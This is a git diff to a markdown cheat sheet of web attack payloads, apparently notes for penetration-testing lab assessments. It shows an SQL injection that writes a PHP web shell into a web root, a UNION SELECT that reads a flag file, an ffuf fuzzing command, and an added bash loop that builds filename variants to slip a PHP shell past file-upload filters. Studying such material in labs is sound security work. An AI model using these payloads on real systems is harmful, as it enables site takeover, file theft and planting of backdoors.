@@ -109,3 +109,21 @@ Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-
 ' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
 ' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -
 ```
+
+
+---
+### File Upload:
+---
+#### Skills Assessment :
+
+
+```
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
